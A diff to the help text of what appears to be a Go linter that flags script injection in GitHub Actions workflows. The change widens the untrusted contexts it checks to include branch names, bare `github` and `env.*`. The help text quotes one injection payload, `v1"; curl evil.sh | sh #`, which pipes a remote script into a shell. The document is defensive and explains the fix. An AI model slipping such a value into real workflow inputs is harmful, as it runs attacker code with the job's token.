@@ -15,9 +15,11 @@ func Cmd() *cobra.Command {
 			"`v1\"; curl evil.sh | sh #` interpolated into a run: line executes the curl, with\n" +
 			"whatever the job's token can reach.\n\n" +
 			"Checks both this repo's workflows and instance-template's — the delivered ones\n" +
-			"matter most, because an injection there is every adopter's. Flags `inputs.*` and\n" +
-			"`github.event.*`: set by whoever dispatches or calls the workflow, and by whoever\n" +
-			"opened the pull request.\n\n" +
+			"matter most, because an injection there is every adopter's. Flags what someone\n" +
+			"outside this repo can set: `inputs.*` and `github.event.*` (whoever dispatches or\n" +
+			"calls the workflow, and whoever opened the pull request), the branch-name\n" +
+			"contexts, bare `github` for `toJSON(github)`, and `env.*` — which is the remedy's\n" +
+			"own back door. A literal `matrix:` is safe; one built from an input is not.\n\n" +
 			"The fix is always the same — move it to `env:`, where the shell expands it after\n" +
 			"parsing and it cannot become syntax.\n\n" +
 			"A SUPERSET OF actionlint, not a duplicate of it: measured, actionlint flags\n" +
